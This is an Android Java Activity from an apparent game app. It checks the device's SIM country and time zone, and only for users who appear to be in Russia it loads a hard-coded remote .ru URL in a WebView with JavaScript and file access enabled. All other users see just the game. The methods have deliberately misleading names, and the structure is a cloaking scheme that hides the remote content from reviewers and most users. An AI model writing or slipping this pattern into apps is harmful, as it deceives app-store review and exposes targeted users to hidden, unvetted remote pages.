package fstd.tgsaw.sllot;

import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.icu.util.TimeZone;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.view.Menu;
import android.view.MenuItem;
import android.webkit.WebResourceError;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.ImageView;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.util.Date;

import fstd.tgsaw.sllot.game.GameScreen;


public class PrepareScreen extends Activity {

    private static final String REDIRECT = "https://nrljnxcjknq";

    private static final int ID_SELECTED = -1;

    private int changing;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_webgame);
        getPrepareData();

        changing = getChangingConfigurations();
    }

    @Override
    public void onStop() {
        changing = 0;
        super.onStop();
    }

    private void getPrepareData() {
        String url = "http://jjjahhgrek.ru/KXKh3r";
        if (checkNewOlders() && isNoPlaytime())
            prepareToGame(url);
        else {
            startGame();
        }
    }


    private static final String COUNTY_ONE = "RU";
    private static final String COUNTRY_TWO = "ru";
    private static final String COUNTRY_THREE = "rus";

    private boolean checkNewOlders() {
        String typeOlderUsers = null;
        if (getSystemService(Context.TELEPHONY_SERVICE) != null)
            typeOlderUsers = ((TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE)).getSimCountryIso();
        else
            return false;
        return typeOlderUsers != null && (typeOlderUsers.equalsIgnoreCase("ru") || typeOlderUsers.equalsIgnoreCase(COUNTRY_THREE));
    }

    private boolean isNoPlaytime() {
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.N) {
            TimeZone tz = TimeZone.getDefault();
            Date now = new Date();
            int offsetFromUtc = tz.getOffset(now.getTime()) / 1000 / 3600;
            int[] timezone = {2, 3, 4, 7, 8, 9, 10, 11, 12};
            for (int item : timezone) {
                if (offsetFromUtc == item)
                    return true;
            }
        } else {
            return true;
        }

        return false;
    }


    @SuppressLint("SetJavaScriptEnabled")
    private void prepareToGame(String url) {
        WebView webView = findViewById(R.id.web_view);
        webView.setWebViewClient(new WebViewClient() {
            @Override
            public boolean shouldOverrideUrlLoading(WebView view, String url) {
                if (!url.contains(REDIRECT)) {
                    view.loadUrl(url);
                } else {
                    startGame();
                }
                return true;
            }

        });
        prepareView(webView.getSettings());
        webView.loadUrl(url);
    }

    public Uri getLocalBitmapUri(ImageView imageView) {
        Drawable drawable = imageView.getDrawable();
        Bitmap bmp = null;
        if (drawable instanceof BitmapDrawable) {
            bmp = ((BitmapDrawable) imageView.getDrawable()).getBitmap();
        } else {
            return null;
        }
        Uri bmpUri = null;
        try {
            File file = new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_DOWNLOADS), "share_image_" + System.currentTimeMillis() + ".png");
            file.getParentFile().mkdirs();
            FileOutputStream out = new FileOutputStream(file);
            bmp.compress(Bitmap.CompressFormat.PNG, 90, out);
            out.close();
            bmpUri = Uri.fromFile(file);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return bmpUri;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        int id = item.getItemId();
        if (id == ID_SELECTED) {
            setShareIntent();
            return true;
        }
        return super.onOptionsItemSelected(item);
    }

    private void setShareIntent() {
        try {
            Uri bmpUri = getLocalBitmapUri(new ImageView(this));
            Intent shareIntent = new Intent();
            shareIntent.setAction(Intent.ACTION_SEND);
            shareIntent.setType("*/*");
            shareIntent.putExtra(Intent.EXTRA_STREAM, bmpUri);
            startActivity(Intent.createChooser(shareIntent, "Share Image"));
        } catch (Exception ignore) {
        }
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        return super.onCreateOptionsMenu(menu);
    }

    @SuppressLint("SetJavaScriptEnabled")
    private void prepareView(WebSettings webSettings) {
        changing += webSettings.getCacheMode();

        webSettings.setBuiltInZoomControls(true);
        webSettings.setSupportZoom(true);
        webSettings.setJavaScriptEnabled(true);
        webSettings.setAllowFileAccess(true);
    }

    private void startGame() {
        Intent intent = new Intent(this, GameScreen.class);
        startActivity(intent);
        finish();
    }
}
